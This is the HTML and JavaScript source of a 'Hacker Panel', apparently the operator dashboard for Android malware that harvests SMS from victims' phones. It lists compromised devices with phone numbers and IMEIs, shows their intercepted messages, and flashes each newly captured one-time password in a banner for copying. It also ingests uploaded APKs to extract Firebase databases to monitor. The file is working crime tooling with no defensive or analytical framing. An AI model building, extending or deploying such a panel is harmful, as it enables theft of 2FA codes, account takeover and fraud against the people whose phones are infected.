<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Hacker Panel - Cyber Edition</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&family=Exo+2:wght@400;600;700;800&display=swap" rel="stylesheet"/>
<style>
:root{
  --bg:#05090e;--bg2:#080d14;--bg3:#0c1420;--bg4:#101c2e;
  --cyan:#00e5ff;--cyan2:#33ecff;--cyan-dim:rgba(0,229,255,.12);
  --red:#ff2244;--red2:#ff4466;--red-dim:rgba(255,34,68,.12);
  --mint:#00d4aa;--amber:#ff9900;--sky:#38bdf8;--lilac:#c084fc;
  --text:#c8e8f0;--sub:#3a6a8a;--dim:#1a3a50;
  --border:rgba(0,229,255,.15);--border2:rgba(0,229,255,.3);
  --rborder:rgba(255,34,68,.2);
}
*{margin:0;padding:0;box-sizing:border-box;}
body{background:var(--bg);color:var(--text);font-family:'Exo 2',sans-serif;min-height:100vh;overflow-x:hidden;}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,229,255,.015) 2px,rgba(0,229,255,.015) 4px);pointer-events:none;z-index:0;}
::-webkit-scrollbar{width:4px;height:4px;}::-webkit-scrollbar-thumb{background:var(--sub);border-radius:4px;}

@keyframes shimmer{0%{background-position:-400% center}100%{background-position:400% center}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
@keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}

.tb{background:rgba(8,13,20,.95);border-bottom:1px solid var(--border);height:54px;display:flex;align-items:center;gap:12px;padding:0 20px;position:sticky;top:0;z-index:200;backdrop-filter:blur(10px);}
.tb::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--red),var(--cyan),var(--red),transparent);}
.tb-logo{font-family:'Orbitron',monospace;font-size:18px;font-weight:800;background:linear-gradient(90deg,var(--cyan),#80f0ff,var(--cyan));background-size:300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shimmer 4s linear infinite;}
.tb-pills{display:flex;gap:6px;margin-right:auto;}
.pill{font-size:10px;font-weight:700;padding:4px 10px;border-radius:20px;letter-spacing:.5px;}
.p-on{background:rgba(0,212,170,.15);color:var(--mint);border:1px solid rgba(0,212,170,.3);}
.p-off{background:var(--red-dim);color:var(--red2);border:1px solid var(--rborder);}
.live-dot{width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 8px var(--mint);animation:pulse 2s infinite;}
.tb-btn{padding:7px 14px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--sub);font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;font-family:'Exo 2',sans-serif;letter-spacing:.5px;white-space:nowrap;}
.tb-btn:hover{color:var(--text);border-color:var(--cyan);background:var(--cyan-dim);}
.tb-btn.danger:hover{color:var(--red2);border-color:var(--red);background:var(--red-dim);}

.layout{display:grid;grid-template-columns:1fr 1fr;gap:0;height:calc(100vh - 54px);}
@media(max-width:900px){.layout{grid-template-columns:1fr;grid-template-rows:1fr 1fr;}}
.col{display:flex;flex-direction:column;height:100%;overflow:hidden;position:relative;}
.col-on{border-right:1px solid var(--border);}
.col-head{padding:16px 20px 12px;flex-shrink:0;background:var(--bg2);position:relative;}
.col-head::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;}
.col-on .col-head::after{background:linear-gradient(90deg,var(--mint),transparent);}
.col-off .col-head::after{background:linear-gradient(90deg,var(--red),transparent);}
.col-title{font-family:'Orbitron',monospace;font-size:16px;font-weight:700;display:flex;align-items:center;gap:10px;margin-bottom:10px;}
.col-on .col-title{color:var(--mint);}
.col-off .col-title{color:var(--red2);}
.col-search{width:100%;padding:10px 14px;background:var(--bg4);border:1px solid var(--border);border-radius:10px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:12px;outline:none;transition:border-color .2s;}
.col-search:focus{border-color:var(--cyan);}
.col-list{flex:1;overflow-y:auto;padding:12px 20px;display:flex;flex-direction:column;gap:10px;}

.dev-card{background:linear-gradient(145deg,var(--bg3),var(--bg2));border:1px solid var(--border);border-radius:14px;padding:16px;cursor:pointer;transition:all .2s;position:relative;animation:fadeUp .3s ease;}
.dev-card:hover{border-color:var(--cyan2);transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,229,255,.1);}
.dev-card.pinned{border-color:rgba(255,153,0,.4);background:linear-gradient(145deg,rgba(255,153,0,.08),var(--bg2));}
.dev-card.online-card{border-left:3px solid var(--mint);}
.dev-card.offline-card{border-left:3px solid var(--red);}
.dc-head{display:flex;gap:12px;margin-bottom:12px;}
.dc-av{width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:20px;background:var(--bg4);border:1px solid var(--border);}
.dc-info{flex:1;min-width:0;}
.dc-name{font-size:15px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:var(--cyan);}
.dc-model{font-size:11px;color:var(--sub);font-family:'Share Tech Mono',monospace;}
.dc-right{display:flex;flex-direction:column;align-items:flex-end;gap:6px;}
.pin-btn{font-size:14px;cursor:pointer;color:var(--dim);transition:color .2s;}
.pin-btn:hover{color:var(--amber);}
.pin-btn.pinned{color:var(--amber);}
.batt{font-size:10px;font-weight:700;padding:2px 6px;border-radius:4px;background:var(--cyan-dim);color:var(--cyan);}
.dc-phone{font-family:'Share Tech Mono',monospace;font-size:14px;font-weight:700;color:var(--text);margin-bottom:8px;cursor:pointer;}
.dc-phone:hover{color:var(--cyan);}
.dc-sms{background:var(--bg4);border:1px solid rgba(0,229,255,.1);border-radius:8px;padding:8px 12px;font-size:11px;color:#a0c4d4;max-height:60px;overflow:hidden;margin-bottom:10px;}
.dc-sms.has-otp{border-color:var(--red);border-left:2px solid var(--red);}
.otp-tag{background:var(--red-dim);color:var(--red2);padding:2px 6px;border-radius:4px;font-weight:800;font-family:'Share Tech Mono',monospace;}
.wish-wrap{position:relative;}
.wish-inp{width:100%;padding:8px 12px;background:var(--bg4);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:'Exo 2',sans-serif;font-size:12px;outline:none;}
.wish-inp:focus{border-color:var(--amber);}
.wish-save{position:absolute;right:6px;top:50%;transform:translateY(-50%);padding:4px 8px;background:rgba(255,153,0,.15);color:var(--amber);border-radius:6px;font-size:10px;font-weight:700;cursor:pointer;opacity:0;transition:opacity .2s;}
.wish-wrap:focus-within .wish-save{opacity:1;}

.drawer{position:fixed;top:54px;right:0;bottom:0;width:420px;background:rgba(8,13,20,.98);border-left:1px solid var(--border);z-index:300;display:flex;flex-direction:column;transform:translateX(100%);transition:transform .3s cubic-bezier(.22,1,.36,1);backdrop-filter:blur(16px);}
.drawer.open{transform:translateX(0);animation:slideIn .3s ease;}
.drawer-head{padding:18px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--bg2);}
.drawer-title{font-family:'Orbitron',monospace;font-size:16px;font-weight:800;color:var(--cyan);}
.drawer-close{cursor:pointer;color:var(--dim);font-size:20px;transition:color .2s;}
.drawer-close:hover{color:var(--red2);}
.drawer-tabs{display:flex;border-bottom:1px solid var(--border);}
.dtab{flex:1;padding:12px;text-align:center;font-size:11px;font-weight:700;color:var(--sub);cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;}
.dtab.active{color:var(--cyan);border-bottom-color:var(--cyan);}
.drawer-body{flex:1;overflow-y:auto;padding:20px;}
.dpane{display:none;}.dpane.active{display:block;animation:fadeUp .2s ease;}

.inp{width:100%;padding:12px 16px;background:var(--bg4);border:1px solid var(--border);border-radius:10px;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:13px;outline:none;margin-bottom:12px;}
.inp:focus{border-color:var(--cyan);}
.btn-full{width:100%;padding:14px;background:linear-gradient(135deg,var(--cyan2),var(--cyan));border:none;border-radius:10px;color:#020810;font-family:'Orbitron',monospace;font-size:13px;font-weight:800;cursor:pointer;box-shadow:0 6px 20px rgba(0,229,255,.3);transition:transform .2s;}
.btn-full:hover{transform:translateY(-2px);}
.btn-red-full{width:100%;padding:14px;background:linear-gradient(135deg,var(--red),#cc0022);border:none;border-radius:10px;color:#fff;font-family:'Orbitron',monospace;font-size:13px;font-weight:800;cursor:pointer;box-shadow:0 6px 20px rgba(255,34,68,.3);transition:transform .2s;}
.sh{font-size:10px;font-weight:800;letter-spacing:1px;text-transform:uppercase;color:var(--sub);margin:20px 0 10px;display:flex;align-items:center;gap:10px;}
.sh::after{content:'';flex:1;height:1px;background:var(--border);}

.fb-url-item{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:12px;margin-bottom:8px;display:flex;align-items:center;gap:10px;}
.fb-url-text{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);flex:1;overflow:hidden;text-overflow:ellipsis;}
.fb-rm{color:var(--red2);background:var(--red-dim);padding:4px 8px;border-radius:6px;cursor:pointer;font-size:10px;font-weight:800;}

.dz{border:2px dashed var(--border2);border-radius:16px;padding:30px 20px;text-align:center;cursor:pointer;background:var(--cyan-dim);transition:all .2s;position:relative;}
.dz:hover{border-color:var(--cyan);background:rgba(0,229,255,.18);}
.dz input{position:absolute;inset:0;opacity:0;cursor:pointer;}

#otpBar{position:fixed;top:0;left:0;right:0;z-index:9999;height:0;overflow:hidden;background:linear-gradient(90deg,#05090e,#101c2e);border-bottom:2px solid var(--red);display:flex;align-items:center;gap:16px;padding:0 24px;transition:height .3s;box-shadow:0 4px 30px rgba(255,34,68,.3);}
#otpBar.show{height:60px;}
.otp-lbl{font-size:10px;font-weight:800;color:var(--sub);letter-spacing:2px;}
.otp-num{font-family:'Share Tech Mono',monospace;font-size:28px;font-weight:900;color:var(--red2);letter-spacing:4px;}

.toast{position:fixed;bottom:20px;left:50%;transform:translate(-50%,20px);background:var(--bg3);border:1px solid var(--border2);padding:12px 24px;border-radius:20px;font-weight:700;opacity:0;transition:all .3s;pointer-events:none;z-index:9999;box-shadow:0 10px 30px rgba(0,0,0,.5);}
.toast.show{opacity:1;transform:translate(-50%,0);}
.overlay{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:250;display:none;backdrop-filter:blur(4px);}
.overlay.show{display:block;}
.empty{text-align:center;padding:40px 20px;color:var(--dim);font-weight:600;}
</style>
</head>
<body>

<div id="otpBar">
  <div class="otp-lbl">NEW OTP</div>
  <div class="otp-num" id="otpNum">──────</div>
  <div style="flex:1;color:var(--sub);font-size:11px;" id="otpSrc"></div>
  <button class="tb-btn" onclick="cp(document.getElementById('otpNum').textContent)">Copy</button>
  <button class="tb-btn" onclick="document.getElementById('otpBar').classList.remove('show')">✕</button>
</div>

<div class="tb">
  <div class="tb-logo">Hacker Panel</div>
  <div class="tb-pills">
    <div class="pill p-on" id="ptOn">0 Online</div>
    <div class="pill p-off" id="ptOff">0 Offline</div>
  </div>
  <div class="live-dot"></div>
  <div style="margin-left:auto;display:flex;gap:10px;">
    <button class="tb-btn" onclick="pollNow()" id="pollBtn">⚡ Sync Now</button>
    <button class="tb-btn" onclick="openDrawer('firebase')">🔌 Firebase</button>
    <button class="tb-btn" onclick="openDrawer('upload')">📦 Upload APK</button>
    <a href="/admin" target="_blank" class="tb-btn">🔒 Admin</a>
  </div>
</div>

<div class="overlay" id="overlay" onclick="closeDrawer()"></div>

<div class="layout">
  <div class="col col-on">
    <div class="col-head">
      <div class="col-title">🟢 ONLINE <span id="onCount" style="color:var(--sub);font-size:12px;margin-left:8px;">0</span></div>
      <input class="col-search" placeholder="Search online..." oninput="renderDevs()" id="sOn"/>
    </div>
    <div class="col-list" id="listOn"><div class="empty">Loading...</div></div>
  </div>
  <div class="col col-off">
    <div class="col-head">
      <div class="col-title">🔴 OFFLINE <span id="offCount" style="color:var(--sub);font-size:12px;margin-left:8px;">0</span></div>
      <input class="col-search" placeholder="Search offline..." oninput="renderDevs()" id="sOff"/>
    </div>
    <div class="col-list" id="listOff"><div class="empty">Loading...</div></div>
  </div>
</div>

<div class="drawer" id="drawer">
  <div class="drawer-head">
    <div class="drawer-title" id="dTitle">Drawer</div>
    <div class="drawer-close" onclick="closeDrawer()">✕</div>
  </div>
  <div class="drawer-tabs">
    <div class="dtab active" onclick="switchTab('firebase')">Firebase</div>
    <div class="dtab" onclick="switchTab('upload')">Upload</div>
    <div class="dtab" onclick="switchTab('detail')">Device</div>
  </div>
  <div class="drawer-body">
    <div class="dpane active" id="dp-firebase">
      <div class="sh">Add Firebase URL</div>
      <input class="inp" id="fbUrl" placeholder="https://url.firebaseio.com"/>
      <input class="inp" id="fbLabel" placeholder="Label (Optional)"/>
      <button class="btn-full" onclick="addFb()">⚡ Add & Probe</button>
      <div class="sh">Monitored (<span id="fbCnt">0</span>)</div>
      <div id="fbList"></div>
    </div>
    <div class="dpane" id="dp-upload">
      <div class="dz" onclick="document.getElementById('fInp').click()">
        <input type="file" id="fInp" multiple accept=".apk,.json" onchange="uploadFiles(this.files)"/>
        <div style="font-size:36px;margin-bottom:10px;">📦</div>
        <div style="font-weight:800;color:var(--cyan);">DROP APKs HERE</div>
        <div style="font-size:11px;color:var(--sub);margin-top:6px;">Firebase URLs auto-extracted & synced</div>
      </div>
      <div id="upLog" style="margin-top:20px;font-size:11px;color:var(--sub);"></div>
    </div>
    <div class="dpane" id="dp-detail">
      <div id="devDet"><div class="empty">Select a device</div></div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
const API = '';
let onDevs=[], offDevs=[], fbUrls=[], selKey=null, lastOtp=null;

async function init(){
  fetchDevs();
  setInterval(fetchDevs, 6000);
}
init();

async function fetchDevs(){
  try{
    const r = await fetch(API+'/api/devices');
    const d = await r.json();
    onDevs = d.online || [];
    offDevs = d.offline || [];
    renderDevs();
    document.getElementById('ptOn').textContent = onDevs.length+' Online';
    document.getElementById('ptOff').textContent = offDevs.length+' Offline';
    document.getElementById('onCount').textContent = onDevs.length;
    document.getElementById('offCount').textContent = offDevs.length;
    checkOtp([...onDevs,...offDevs]);
  }catch(e){}
  try{
    const r2 = await fetch(API+'/api/firebase/list');
    const d2 = await r2.json();
    fbUrls = d2.urls || [];
    renderFb();
  }catch(e){}
}

function renderDevs(){
  const qo = (document.getElementById('sOn').value||'').toLowerCase();
  const qf = (document.getElementById('sOff').value||'').toLowerCase();
  
  const fOn = onDevs.filter(d=>(d.name+d.phone+d.model+d.imei).toLowerCase().includes(qo));
  const fOff = offDevs.filter(d=>(d.name+d.phone+d.model+d.imei).toLowerCase().includes(qf));
  
  document.getElementById('listOn').innerHTML = fOn.length ? fOn.map(d=>dCard(d,true)).join('') : '<div class="empty">No online devices</div>';
  document.getElementById('listOff').innerHTML = fOff.length ? fOff.map(d=>dCard(d,false)).join('') : '<div class="empty">No offline devices</div>';
}

function dCard(d, isOn){
  const k = d.key;
  const pinCls = d.pinned ? 'pinned' : '';
  const otp = d.last_sms?.otp ? `<span class="otp-tag" onclick="cp('${d.last_sms.otp}');event.stopPropagation()">OTP: ${d.last_sms.otp}</span>` : '';
  const smsBody = d.last_sms ? `<div class="dc-sms ${otp?'has-otp':''}">${otp} ${esc(d.last_sms.body).substring(0,80)}...</div>` : '';
  
  return `
  <div class="dev-card ${isOn?'online-card':'offline-card'} ${pinCls}" onclick="openDev('${k}')">
    <div class="dc-head">
      <div class="dc-av">${isOn?'📱':'💤'}</div>
      <div class="dc-info">
        <div class="dc-name">${esc(d.name||d.model||'Unknown')}</div>
        <div class="dc-model">${esc(d.model||'')}</div>
      </div>
      <div class="dc-right">
        <div class="pin-btn ${pinCls}" onclick="pin('${k}');event.stopPropagation()">📌</div>
        ${d.battery!=null?`<div class="batt">${d.battery}%</div>`:``}
      </div>
    </div>
    <div class="dc-phone" onclick="cp('${d.phone||''}');event.stopPropagation()">${esc(d.phone||'—')}</div>
    ${smsBody}
    <div class="wish-wrap">
      <input class="wish-inp" id="w_${k}" value="${esc(d.wish||'')}" placeholder="Last wish..." onclick="event.stopPropagation()" onkeydown="if(event.key==='Enter')saveW('${k}')"/>
      <div class="wish-save" onclick="saveW('${k}');event.stopPropagation()">Save</div>
    </div>
  </div>`;
}

function openDev(k){
  selKey = k;
  const d = [...onDevs,...offDevs].find(x=>x.key===k);
  if(!d) return;
  openDrawer('detail');
  document.getElementById('devDet').innerHTML = `
    <div style="font-size:20px;font-weight:800;color:var(--cyan);margin-bottom:14px;">${esc(d.name||d.model||'Unknown')}</div>
    <div class="inp">Phone: ${esc(d.phone||'—')}</div>
    <div class="inp">Model: ${esc(d.model||'—')}</div>
    <div class="inp">IMEI: ${esc(d.imei||'—')}</div>
    <div class="inp">Source: ${esc(d.src||'—')}</div>
    <button class="btn-red-full" onclick="toast('Use Firebase to send commands')">💀 NUKE DEVICE</button>
  `;
}

async function pin(k){
  await fetch(API+'/api/device/pin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:k})});
  fetchDevs();
}
async function saveW(k){
  const w = document.getElementById('w_'+k).value;
  await fetch(API+'/api/device/wish',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:k,wish:w})});
  toast('Saved');
}
async function pollNow(){
  document.getElementById('pollBtn').textContent='Syncing...';
  await fetch(API+'/api/poll_now',{method:'POST'});
  toast('Polling triggered');
  setTimeout(()=>document.getElementById('pollBtn').textContent='⚡ Sync Now', 3000);
}
async function addFb(){
  const url=document.getElementById('fbUrl').value.trim();
  const label=document.getElementById('fbLabel').value.trim();
  if(!url) return;
  await fetch(API+'/api/firebase/add',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,label})});
  document.getElementById('fbUrl').value='';
  document.getElementById('fbLabel').value='';
  toast('Added & Probing');
  fetchDevs();
}
async function rmFb(u){
  await fetch(API+'/api/firebase/remove',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:u})});
  fetchDevs();
}
function renderFb(){
  document.getElementById('fbCnt').textContent=fbUrls.length;
  document.getElementById('fbList').innerHTML=fbUrls.map(u=>`<div class="fb-url-item"><div class="fb-url-text">${esc(u.url)}<br><span style="color:var(--sub);font-size:9px;">${esc(u.label||'')}</span></div><div class="fb-rm" onclick="rmFb('${u.url}')">✕</div></div>`).join('');
}
async function uploadFiles(files){
  toast('Uploading '+files.length+' files...');
  for(let i=0;i<files.length;i++){
    const fd=new FormData(); fd.append('apk',files[i]);
    const r=await fetch(API+'/api/upload',{method:'POST',body:fd});
    const d=await r.json();
    if(d.auto_added_firebase?.length){
      document.getElementById('upLog').innerHTML += `<div><b style="color:var(--mint)">Found ${d.auto_added_firebase.length} DBs in ${files[i].name}</b></div>`;
    }else{
      document.getElementById('upLog').innerHTML += `<div>Checked ${files[i].name}</div>`;
    }
  }
  toast('Upload complete!');
  fetchDevs();
}

function checkOtp(arr){
  for(const d of arr){
    if(d.last_sms?.otp && d.last_sms.otp !== lastOtp){
      lastOtp = d.last_sms.otp;
      document.getElementById('otpNum').textContent = lastOtp;
      document.getElementById('otpSrc').textContent = (d.name||d.phone||'') + ' — ' + (d.last_sms.sender||'');
      document.getElementById('otpBar').classList.add('show');
    }
  }
}

function openDrawer(tab){
  document.getElementById('drawer').classList.add('open');
  document.getElementById('overlay').classList.add('show');
  if(tab) switchTab(tab);
}
function closeDrawer(){
  document.getElementById('drawer').classList.remove('open');
  document.getElementById('overlay').classList.remove('show');
}
function switchTab(t){
  document.querySelectorAll('.dtab').forEach((el,i)=>el.classList.toggle('active',['firebase','upload','detail'][i]===t));
  document.querySelectorAll('.dpane').forEach(el=>el.classList.remove('active'));
  document.getElementById('dp-'+t)?.classList.add('active');
  document.getElementById('dTitle').textContent = t==='firebase'?'🔌 Firebase':t==='upload'?'📦 Upload':'📱 Device';
}

function esc(s){return String(s||'').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function cp(t){navigator.clipboard.writeText(t);toast('Copied!');}
let _to;function toast(m){const e=document.getElementById('toast');e.textContent=m;e.classList.add('show');clearTimeout(_to);_to=setTimeout(()=>e.classList.remove('show'),3000);}
</script>
</body></html>
